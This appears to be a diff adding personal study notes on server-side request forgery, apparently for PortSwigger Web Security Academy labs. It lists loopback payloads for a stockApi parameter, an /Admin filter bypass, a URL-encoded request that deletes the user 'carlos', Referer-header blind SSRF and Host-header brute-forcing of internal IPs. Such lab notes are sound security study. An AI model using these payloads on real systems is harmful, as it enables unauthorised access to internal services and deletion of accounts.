@@ -1,0 +1,34 @@
+SSRF most common with stock check func that checks an external url as POST 
+try different payloads present on burp site:
+stockApi=http://127.0.0.1
+stockApi=http://127.1
+stockApi=http://localhost
+
+then, /admin might be blocked
+try /Admin or different bypasses
+
+solution:
+stockApi=http://127.1/Admin/delete?username=carlos
+stockApi=http%3A%2F%2F127.1%2FAdmin%2Fdelete%3fusername%3dcarlos - url encoded
+
+Also theres stockCheck.js and stockCheckPayload.js when this happens
+
+BLIND SSRF, aka there is no functionalities / what to check as last resort sorta scenario
+
+Use the 
+Referer: 
+header for different type of payloads, like the burp collaborator server
+
+
+bruteforce internal IP with intruder
+
+POST /admin/delete HTTP/2
+Host: 192.168.0.51
+
+csrf=8H3qAZBfvXgOMDHGhanBv48Wg4bleReq&username=carlos
+
+if doesnt work, try supplying the whole URL as the GET /endpoint 
+like so:
+
+GET https://0aeb00bb039759ae80c3d5b000f90077.web-security-academy.net/admin HTTP/2
+Host: 192.168.0.§1§
